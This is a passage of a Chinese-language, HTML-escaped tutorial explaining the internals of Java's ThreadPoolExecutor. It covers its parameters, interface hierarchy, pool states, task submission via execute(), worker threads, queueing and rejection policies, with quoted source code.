  &lt;li&gt;keepAliveTime：表示线程没有任务执行时最多保持多久时间会终止。默认情况下，只有当线程池中的线程数大于corePoolSize时，keepAliveTime才会起作用，直到线程池中的线程数不大于corePoolSize，即当线程池中的线程数大于corePoolSize时，如果一个线程空闲的时间达到keepAliveTime，则会终止，直到线程池中的线程数不超过corePoolSize。但是如果调用了allowCoreThreadTimeOut(boolean)方法，在线程池中的线程数不大于corePoolSize时，keepAliveTime参数也会起作用，直到线程池中的线程数为0；&lt;/li&gt;
  &lt;li&gt;unit：参数keepAliveTime的时间单位，有7种取值，在TimeUnit类中有7种静态属性：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;TimeUnit.DAYS;               //天
TimeUnit.HOURS;             //小时
TimeUnit.MINUTES;           //分钟
TimeUnit.SECONDS;           //秒
TimeUnit.MILLISECONDS;      //毫秒
TimeUnit.MICROSECONDS;      //微妙
TimeUnit.NANOSECONDS;       //纳秒
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;workQueue：一个阻塞队列，用来存储等待执行的任务，这个参数的选择也很重要，会对线程池的运行过程产生重大影响，一般来说，这里的阻塞队列有以下几种选择：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ArrayBlockingQueue;
LinkedBlockingQueue;
SynchronousQueue;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ArrayBlockingQueue和PriorityBlockingQueue使用较少，一般使用LinkedBlockingQueue和Synchronous。线程池的排队策略与BlockingQueue有关。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;threadFactory：线程工厂，主要用来创建线程；&lt;/li&gt;
  &lt;li&gt;handler：表示当拒绝处理任务时的策略，有以下四种取值：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。 
ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。 
ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）
ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从上面给出的ThreadPoolExecutor类的代码可以知道，ThreadPoolExecutor继承了AbstractExecutorService，我们来看一下AbstractExecutorService的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public abstract class AbstractExecutorService implements ExecutorService {
 
     
    protected &amp;lt;T&amp;gt; RunnableFuture&amp;lt;T&amp;gt; newTaskFor(Runnable runnable, T value) { };
    protected &amp;lt;T&amp;gt; RunnableFuture&amp;lt;T&amp;gt; newTaskFor(Callable&amp;lt;T&amp;gt; callable) { };
    public Future&amp;lt;?&amp;gt; submit(Runnable task) {};
    public &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Runnable task, T result) { };
    public &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Callable&amp;lt;T&amp;gt; task) { };
    private &amp;lt;T&amp;gt; T doInvokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                            boolean timed, long nanos)
        throws InterruptedException, ExecutionException, TimeoutException {
    };
    public &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException, ExecutionException {
    };
    public &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                           long timeout, TimeUnit unit)
        throws InterruptedException, ExecutionException, TimeoutException {
    };
    public &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException {
    };
    public &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                                         long timeout, TimeUnit unit)
        throws InterruptedException {
    };
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;AbstractExecutorService是一个抽象类，它实现了ExecutorService接口。&lt;/p&gt;

&lt;p&gt;我们接着看ExecutorService接口的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public interface ExecutorService extends Executor {
 
    void shutdown();
    boolean isShutdown();
    boolean isTerminated();
    boolean awaitTermination(long timeout, TimeUnit unit)
        throws InterruptedException;
    &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Callable&amp;lt;T&amp;gt; task);
    &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Runnable task, T result);
    Future&amp;lt;?&amp;gt; submit(Runnable task);
    &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException;
    &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                                  long timeout, TimeUnit unit)
        throws InterruptedException;
 
    &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException, ExecutionException;
    &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                    long timeout, TimeUnit unit)
        throws InterruptedException, ExecutionException, TimeoutException;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而ExecutorService又是继承了Executor接口，我们看一下Executor接口的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public interface Executor {
    void execute(Runnable command);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Executor是一个顶层接口，在它里面只声明了一个方法execute(Runnable)，返回值为void，参数为Runnable类型，从字面意思可以理解，就是用来执行传进去的任务的；&lt;/p&gt;

&lt;p&gt;然后ExecutorService接口继承了Executor接口，并声明了一些方法：submit、invokeAll、invokeAny以及shutDown等；&lt;/p&gt;

&lt;p&gt;抽象类AbstractExecutorService实现了ExecutorService接口，基本实现了ExecutorService中声明的所有方法；&lt;/p&gt;

&lt;p&gt;然后ThreadPoolExecutor继承了类AbstractExecutorService。&lt;/p&gt;

&lt;p&gt;在ThreadPoolExecutor类中有几个非常重要的方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;execute()
submit()
shutdown()
shutdownNow()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;execute()方法实际上是Executor中声明的方法，在ThreadPoolExecutor进行了具体的实现，这个方法是ThreadPoolExecutor的核心方法，通过这个方法可以向线程池提交一个任务，交由线程池去执行。&lt;/p&gt;

&lt;p&gt;submit()方法是在ExecutorService中声明的方法，在AbstractExecutorService就已经有了具体的实现，在ThreadPoolExecutor中并没有对其进行重写，这个方法也是用来向线程池提交任务的，但是它和execute()方法不同，它能够返回任务执行的结果，去看submit()方法的实现，会发现它实际上还是调用的execute()方法，只不过它利用了Future来获取任务执行结果（Future相关内容将在下一篇讲述）。&lt;/p&gt;

&lt;p&gt;shutdown()和shutdownNow()是用来关闭线程池的。&lt;/p&gt;

&lt;p&gt;还有很多其他的方法：&lt;/p&gt;

&lt;p&gt;比如：getQueue() 、getPoolSize() 、getActiveCount()、getCompletedTaskCount()等获取与线程池相关属性的方法&lt;/p&gt;

&lt;h1 id=&quot;线程池实现原理&quot;&gt;线程池实现原理&lt;/h1&gt;

&lt;h2 id=&quot;线程池状态&quot;&gt;&lt;strong&gt;线程池状态&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在ThreadPoolExecutor中定义了一个volatile变量，另外定义了几个static final变量表示线程池的各个状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;volatile int runState;
static final int RUNNING    = 0;
static final int SHUTDOWN   = 1;
static final int STOP       = 2;
static final int TERMINATED = 3;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;runState表示当前线程池的状态，它是一个volatile变量用来保证线程之间的可见性；&lt;/p&gt;

&lt;p&gt;　　下面的几个static final变量表示runState可能的几个取值。&lt;/p&gt;

&lt;p&gt;　　当创建线程池后，初始时，线程池处于RUNNING状态；&lt;/p&gt;

&lt;p&gt;　　如果调用了shutdown()方法，则线程池处于SHUTDOWN状态，此时线程池不能够接受新的任务，它会等待所有任务执行完毕；&lt;/p&gt;

&lt;p&gt;　　如果调用了shutdownNow()方法，则线程池处于STOP状态，此时线程池不能接受新的任务，并且会去尝试终止正在执行的任务；&lt;/p&gt;

&lt;p&gt;　　当线程池处于SHUTDOWN或STOP状态，并且所有工作线程已经销毁，任务缓存队列已经清空或执行结束后，线程池被设置为TERMINATED状态。&lt;/p&gt;

&lt;h2 id=&quot;任务的执行&quot;&gt;&lt;strong&gt;任务的执行&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在了解将任务提交给线程池到任务执行完毕整个过程之前，我们先来看一下ThreadPoolExecutor类中其他的一些比较重要成员变量：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private final BlockingQueue&amp;lt;Runnable&amp;gt; workQueue;              //任务缓存队列，用来存放等待执行的任务
private final ReentrantLock mainLock = new ReentrantLock();   //线程池的主要状态锁，对线程池状态（比如线程池大小
                                                              //、runState等）的改变都要使用这个锁
private final HashSet&amp;lt;Worker&amp;gt; workers = new HashSet&amp;lt;Worker&amp;gt;();  //用来存放工作集
 
private volatile long  keepAliveTime;    //线程存货时间   
private volatile boolean allowCoreThreadTimeOut;   //是否允许为核心线程设置存活时间
private volatile int   corePoolSize;     //核心池的大小（即线程池中的线程数目大于这个参数时，提交的任务会被放进任务缓存队列）
private volatile int   maximumPoolSize;   //线程池最大能容忍的线程数
 
private volatile int   poolSize;       //线程池中当前的线程数
 
private volatile RejectedExecutionHandler handler; //任务拒绝策略
 
private volatile ThreadFactory threadFactory;   //线程工厂，用来创建线程
 
private int largestPoolSize;   //用来记录线程池中曾经出现过的最大线程数
 
private long completedTaskCount;   //用来记录已经执行完毕的任务个数
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;每个变量的作用都已经标明出来了，这里要重点解释一下corePoolSize、maximumPoolSize、largestPoolSize三个变量。&lt;/p&gt;

&lt;p&gt;　　corePoolSize在很多地方被翻译成核心池大小，其实我的理解这个就是线程池的大小。举个简单的例子：&lt;/p&gt;

&lt;p&gt;　　假如有一个工厂，工厂里面有10个工人，每个工人同时只能做一件任务。&lt;/p&gt;

&lt;p&gt;　　因此只要当10个工人中有工人是空闲的，来了任务就分配给空闲的工人做；&lt;/p&gt;

&lt;p&gt;　　当10个工人都有任务在做时，如果还来了任务，就把任务进行排队等待；&lt;/p&gt;

&lt;p&gt;　　如果说新任务数目增长的速度远远大于工人做任务的速度，那么此时工厂主管可能会想补救措施，比如重新招4个临时工人进来；&lt;/p&gt;

&lt;p&gt;　　然后就将任务也分配给这4个临时工人做；&lt;/p&gt;

&lt;p&gt;　　如果说着14个工人做任务的速度还是不够，此时工厂主管可能就要考虑不再接收新的任务或者抛弃前面的一些任务了。&lt;/p&gt;

&lt;p&gt;　　当这14个工人当中有人空闲时，而新任务增长的速度又比较缓慢，工厂主管可能就考虑辞掉4个临时工了，只保持原来的10个工人，毕竟请额外的工人是要花钱的。&lt;/p&gt;

&lt;p&gt;　　这个例子中的corePoolSize就是10，而maximumPoolSize就是14（10+4）。&lt;/p&gt;

&lt;p&gt;　　也就是说corePoolSize就是线程池大小，maximumPoolSize在我看来是线程池的一种补救措施，即任务量突然过大时的一种补救措施。&lt;/p&gt;

&lt;p&gt;　　不过为了方便理解，在本文后面还是将corePoolSize翻译成核心池大小。&lt;/p&gt;

&lt;p&gt;　　largestPoolSize只是一个用来起记录作用的变量，用来记录线程池中曾经有过的最大线程数目，跟线程池的容量没有任何关系。&lt;/p&gt;

&lt;p&gt;　　下面我们进入正题，看一下任务从提交到最终执行完毕经历了哪些过程。&lt;/p&gt;

&lt;p&gt;　　在ThreadPoolExecutor类中，最核心的任务提交方法是execute()方法，虽然通过submit也可以提交任务，但是实际上submit方法里面最终调用的还是execute()方法，所以我们只需要研究execute()方法的实现原理即可：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public void execute(Runnable command) {
    if (command == null)
        throw new NullPointerException();
    if (poolSize &amp;gt;= corePoolSize || !addIfUnderCorePoolSize(command)) {
        if (runState == RUNNING &amp;amp;&amp;amp; workQueue.offer(command)) {
            if (runState != RUNNING || poolSize == 0)
                ensureQueuedTaskHandled(command);
        }
        else if (!addIfUnderMaximumPoolSize(command))
            reject(command); // is shutdown or saturated
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面的代码可能看起来不是那么容易理解，下面我们一句一句解释：&lt;/p&gt;

&lt;p&gt;　　首先，判断提交的任务command是否为null，若是null，则抛出空指针异常；&lt;/p&gt;

&lt;p&gt;　　接着是这句，这句要好好理解一下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (poolSize &amp;gt;= corePoolSize || !addIfUnderCorePoolSize(command))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于是或条件运算符，所以先计算前半部分的值，如果线程池中当前线程数不小于核心池大小，那么就会直接进入下面的if语句块了。&lt;/p&gt;

&lt;p&gt;　　如果线程池中当前线程数小于核心池大小，则接着执行后半部分，也就是执行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;addIfUnderCorePoolSize(command)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果执行完addIfUnderCorePoolSize这个方法返回false，则继续执行下面的if语句块，否则整个方法就直接执行完毕了。&lt;/p&gt;

&lt;p&gt;　　如果执行完addIfUnderCorePoolSize这个方法返回false，然后接着判断：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (runState == RUNNING &amp;amp;&amp;amp; workQueue.offer(command))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果当前线程池处于RUNNING状态，则将任务放入任务缓存队列；如果当前线程池不处于RUNNING状态或者任务放入缓存队列失败，则执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;addIfUnderMaximumPoolSize(command)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果执行addIfUnderMaximumPoolSize方法失败，则执行reject()方法进行任务拒绝处理。&lt;/p&gt;

&lt;p&gt;　　回到前面：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (runState == RUNNING &amp;amp;&amp;amp; workQueue.offer(command))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这句的执行，如果说当前线程池处于RUNNING状态且将任务放入任务缓存队列成功，则继续进行判断：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (runState != RUNNING || poolSize == 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这句判断是为了防止在将此任务添加进任务缓存队列的同时其他线程突然调用shutdown或者shutdownNow方法关闭了线程池的一种应急措施。如果是这样就执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ensureQueuedTaskHandled(command)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;进行应急处理，从名字可以看出是保证 添加到任务缓存队列中的任务得到处理。&lt;/p&gt;

&lt;p&gt;　　我们接着看2个关键方法的实现：addIfUnderCorePoolSize和addIfUnderMaximumPoolSize：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private boolean addIfUnderCorePoolSize(Runnable firstTask) {
    Thread t = null;
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    try {
        if (poolSize &amp;lt; corePoolSize &amp;amp;&amp;amp; runState == RUNNING)
            t = addThread(firstTask);        //创建线程去执行firstTask任务   
        } finally {
        mainLock.unlock();
    }
    if (t == null)
        return false;
    t.start();
    return true;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个是addIfUnderCorePoolSize方法的具体实现，从名字可以看出它的意图就是当低于核心吃大小时执行的方法。下面看其具体实现，首先获取到锁，因为这地方涉及到线程池状态的变化，先通过if语句判断当前线程池中的线程数目是否小于核心池大小，有朋友也许会有疑问：前面在execute()方法中不是已经判断过了吗，只有线程池当前线程数目小于核心池大小才会执行addIfUnderCorePoolSize方法的，为何这地方还要继续判断？原因很简单，前面的判断过程中并没有加锁，因此可能在execute方法判断的时候poolSize小于corePoolSize，而判断完之后，在其他线程中又向线程池提交了任务，就可能导致poolSize不小于corePoolSize了，所以需要在这个地方继续判断。然后接着判断线程池的状态是否为RUNNING，原因也很简单，因为有可能在其他线程中调用了shutdown或者shutdownNow方法。然后就是执行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;t = addThread(firstTask);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个方法也非常关键，传进去的参数为提交的任务，返回值为Thread类型。然后接着在下面判断t是否为空，为空则表明创建线程失败（即poolSize&amp;gt;=corePoolSize或者runState不等于RUNNING），否则调用t.start()方法启动线程。&lt;/p&gt;

&lt;p&gt;　　我们来看一下addThread方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private Thread addThread(Runnable firstTask) {
    Worker w = new Worker(firstTask);
    Thread t = threadFactory.newThread(w);  //创建一个线程，执行任务   
    if (t != null) {
        w.thread = t;            //将创建的线程的引用赋值为w的成员变量       
        workers.add(w);
        int nt = ++poolSize;     //当前线程数加1       
        if (nt &amp;gt; largestPoolSize)
            largestPoolSize = nt;
    }
    return t;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在addThread方法中，首先用提交的任务创建了一个Worker对象，然后调用线程工厂threadFactory创建了一个新的线程t，然后将线程t的引用赋值给了Worker对象的成员变量thread，接着通过workers.add(w)将Worker对象添加到工作集当中。&lt;/p&gt;

&lt;p&gt;　　下面我们看一下Worker类的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private final class Worker implements Runnable {
    private final ReentrantLock runLock = new ReentrantLock();
    private Runnable firstTask;
    volatile long completedTasks;
    Thread thread;
    Worker(Runnable firstTask) {
        this.firstTask = firstTask;
    }
    boolean isActive() {
        return runLock.isLocked();
    }
    void interruptIfIdle() {
        final ReentrantLock runLock = this.runLock;
        if (runLock.tryLock()) {
            try {
        if (thread != Thread.currentThread())
        thread.interrupt();
            } finally {
                runLock.unlock();
            }
        }
    }
    void interruptNow() {
        thread.interrupt();
    }
 
    private void runTask(Runnable task) {
        final ReentrantLock runLock = this.runLock;
        runLock.lock();
        try {
            if (runState &amp;lt; STOP &amp;amp;&amp;amp;
                Thread.interrupted() &amp;amp;&amp;amp;
                runState &amp;gt;= STOP)
            boolean ran = false;
            beforeExecute(thread, task);   //beforeExecute方法是ThreadPoolExecutor类的一个方法，没有具体实现，用户可以根据
            //自己需要重载这个方法和后面的afterExecute方法来进行一些统计信息，比如某个任务的执行时间等           
            try {
                task.run();
                ran = true;
                afterExecute(task, null);
                ++completedTasks;
            } catch (RuntimeException ex) {
                if (!ran)
                    afterExecute(task, ex);
                throw ex;
            }
        } finally {
            runLock.unlock();
        }
    }
 
    public void run() {
        try {
            Runnable task = firstTask;
            firstTask = null;
            while (task != null || (task = getTask()) != null) {
                runTask(task);
                task = null;
            }
        } finally {
            workerDone(this);   //当任务队列中没有任务时，进行清理工作       
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;它实际上实现了Runnable接口，因此上面的Thread t = threadFactory.newThread(w);效果跟下面这句的效果基本一样：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;Thread t = new Thread(w);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;相当于传进去了一个Runnable任务，在线程t中执行这个Runnable。&lt;/p&gt;

&lt;p&gt;　　既然Worker实现了Runnable接口，那么自然最核心的方法便是run()方法了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public void run() {
    try {
        Runnable task = firstTask;
        firstTask = null;
        while (task != null || (task = getTask()) != null) {
            runTask(task);
            task = null;
        }
    } finally {
        workerDone(this);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从run方法的实现可以看出，它首先执行的是通过构造器传进来的任务firstTask，在调用runTask()执行完firstTask之后，在while循环里面不断通过getTask()去取新的任务来执行，那么去哪里取呢？自然是从任务缓存队列里面去取，getTask是ThreadPoolExecutor类中的方法，并不是Worker类中的方法，下面是getTask方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;Runnable getTask() {
    for (;;) {
        try {
            int state = runState;
            if (state &amp;gt; SHUTDOWN)
                return null;
            Runnable r;
            if (state == SHUTDOWN)  // Help drain queue
                r = workQueue.poll();
            else if (poolSize &amp;gt; corePoolSize || allowCoreThreadTimeOut) //如果线程数大于核心池大小或者允许为核心池线程设置空闲时间，
                //则通过poll取任务，若等待一定的时间取不到任务，则返回null
                r = workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS);
            else
                r = workQueue.take();
            if (r != null)
                return r;
            if (workerCanExit()) {    //如果没取到任务，即r为null，则判断当前的worker是否可以退出
                if (runState &amp;gt;= SHUTDOWN) // Wake up others
                    interruptIdleWorkers();   //中断处于空闲状态的worker
                return null;
            }
            // Else retry
        } catch (InterruptedException ie) {
            // On interruption, re-check runState
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在getTask中，先判断当前线程池状态，如果runState大于SHUTDOWN（即为STOP或者TERMINATED），则直接返回null。&lt;/p&gt;

&lt;p&gt;　　如果runState为SHUTDOWN或者RUNNING，则从任务缓存队列取任务。&lt;/p&gt;

&lt;p&gt;　　如果当前线程池的线程数大于核心池大小corePoolSize或者允许为核心池中的线程设置空闲存活时间，则调用poll(time,timeUnit)来取任务，这个方法会等待一定的时间，如果取不到任务就返回null。&lt;/p&gt;

&lt;p&gt;　　然后判断取到的任务r是否为null，为null则通过调用workerCanExit()方法来判断当前worker是否可以退出，我们看一下workerCanExit()的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private boolean workerCanExit() {
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    boolean canExit;
    //如果runState大于等于STOP，或者任务缓存队列为空了
    //或者  允许为核心池线程设置空闲存活时间并且线程池中的线程数目大于1
    try {
        canExit = runState &amp;gt;= STOP ||
            workQueue.isEmpty() ||
            (allowCoreThreadTimeOut &amp;amp;&amp;amp;
             poolSize &amp;gt; Math.max(1, corePoolSize));
    } finally {
        mainLock.unlock();
    }
    return canExit;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;也就是说如果线程池处于STOP状态、或者任务队列已为空或者允许为核心池线程设置空闲存活时间并且线程数大于1时，允许worker退出。如果允许worker退出，则调用interruptIdleWorkers()中断处于空闲状态的worker，我们看一下interruptIdleWorkers()的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;void interruptIdleWorkers() {
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    try {
        for (Worker w : workers)  //实际上调用的是worker的interruptIfIdle()方法
            w.interruptIfIdle();
    } finally {
        mainLock.unlock();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从实现可以看出，它实际上调用的是worker的interruptIfIdle()方法，在worker的interruptIfIdle()方法中：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;void interruptIfIdle() {
    final ReentrantLock runLock = this.runLock;
    if (runLock.tryLock()) {    //注意这里，是调用tryLock()来获取锁的，因为如果当前worker正在执行任务，锁已经被获取了，是无法获取到锁的
                                //如果成功获取了锁，说明当前worker处于空闲状态
        try {
    if (thread != Thread.currentThread())  
    thread.interrupt();
        } finally {
            runLock.unlock();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里有一个非常巧妙的设计方式，假如我们来设计线程池，可能会有一个任务分派线程，当发现有线程空闲时，就从任务缓存队列中取一个任务交给空闲线程执行。但是在这里，并没有采用这样的方式，因为这样会要额外地对任务分派线程进行管理，无形地会增加难度和复杂度，这里直接让执行完任务的线程去任务缓存队列里面取任务来执行。&lt;/p&gt;

&lt;p&gt;　我们再看addIfUnderMaximumPoolSize方法的实现，这个方法的实现思想和addIfUnderCorePoolSize方法的实现思想非常相似，唯一的区别在于addIfUnderMaximumPoolSize方法是在线程池中的线程数达到了核心池大小并且往任务队列中添加任务失败的情况下执行的：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private boolean addIfUnderMaximumPoolSize(Runnable firstTask) {
    Thread t = null;
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    try {
        if (poolSize &amp;lt; maximumPoolSize &amp;amp;&amp;amp; runState == RUNNING)
            t = addThread(firstTask);
    } finally {
        mainLock.unlock();
    }
    if (t == null)
        return false;
    t.start();
    return true;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到没有，其实它和addIfUnderCorePoolSize方法的实现基本一模一样，只是if语句判断条件中的poolSize &amp;lt; maximumPoolSize不同而已。&lt;/p&gt;

&lt;p&gt;　　到这里，大部分朋友应该对任务提交给线程池之后到被执行的整个过程有了一个基本的了解，下面总结一下：&lt;/p&gt;

&lt;p&gt;　　1）首先，要清楚corePoolSize和maximumPoolSize的含义；&lt;/p&gt;

&lt;p&gt;　　2）其次，要知道Worker是用来起到什么作用的；&lt;/p&gt;

&lt;p&gt;　　3）要知道任务提交给线程池之后的处理策略，这里总结一下主要有4点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果当前线程池中的线程数目小于corePoolSize，则每来一个任务，就会创建一个线程去执行这个任务；&lt;/li&gt;
  &lt;li&gt;如果当前线程池中的线程数目&amp;gt;=corePoolSize，则每来一个任务，会尝试将其添加到任务缓存队列当中，若添加成功，则该任务会等待空闲线程将其取出去执行；若添加失败（一般来说是任务缓存队列已满），则会尝试创建新的线程去执行这个任务；&lt;/li&gt;
  &lt;li&gt;如果当前线程池中的线程数目达到maximumPoolSize，则会采取任务拒绝策略进行处理；&lt;/li&gt;
  &lt;li&gt;如果线程池中的线程数量大于  corePoolSize时，如果某线程空闲时间超过keepAliveTime，线程将被终止，直至线程池中的线程数目不大于corePoolSize；如果允许为核心池中的线程设置存活时间，那么核心池中的线程空闲时间超过keepAliveTime，线程也会被终止&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;线程池中的线程初始化&quot;&gt;&lt;strong&gt;线程池中的线程初始化&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;默认情况下，创建线程池之后，线程池中是没有线程的，需要提交任务之后才会创建线程。&lt;/p&gt;

&lt;p&gt;　　在实际中如果需要线程池创建之后立即创建线程，可以通过以下两个方法办到：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;prestartCoreThread()：初始化一个核心线程；&lt;/li&gt;
  &lt;li&gt;prestartAllCoreThreads()：初始化所有核心线程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　　下面是这2个方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public boolean prestartCoreThread() {
    return addIfUnderCorePoolSize(null); //注意传进去的参数是null
}
 
public int prestartAllCoreThreads() {
    int n = 0;
    while (addIfUnderCorePoolSize(null))//注意传进去的参数是null
        ++n;
    return n;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意上面传进去的参数是null，根据第2小节的分析可知如果传进去的参数为null，则最后执行线程会阻塞在getTask方法中的&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;r = workQueue.take();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;即等待任务队列中有任务&lt;/p&gt;

&lt;h2 id=&quot;任务缓存队列及排队策略&quot;&gt;&lt;strong&gt;任务缓存队列及排队策略&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在前面我们多次提到了任务缓存队列，即workQueue，它用来存放等待执行的任务。&lt;/p&gt;

&lt;p&gt;　　workQueue的类型为BlockingQueue&lt;Runnable&gt;，通常可以取下面三种类型：&lt;/Runnable&gt;&lt;/p&gt;

&lt;p&gt;　　1）ArrayBlockingQueue：基于数组的先进先出队列，此队列创建时必须指定大小；&lt;/p&gt;

&lt;p&gt;　　2）LinkedBlockingQueue：基于链表的先进先出队列，如果创建时没有指定此队列大小，则默认为Integer.MAX_VALUE；&lt;/p&gt;

&lt;p&gt;　　3）synchronousQueue：这个队列比较特殊，它不会保存提交的任务，而是将直接新建一个线程来执行新来的任务。&lt;/p&gt;

&lt;h2 id=&quot;任务拒绝策略&quot;&gt;&lt;strong&gt;任务拒绝策略&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略，通常有以下四种策略：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。
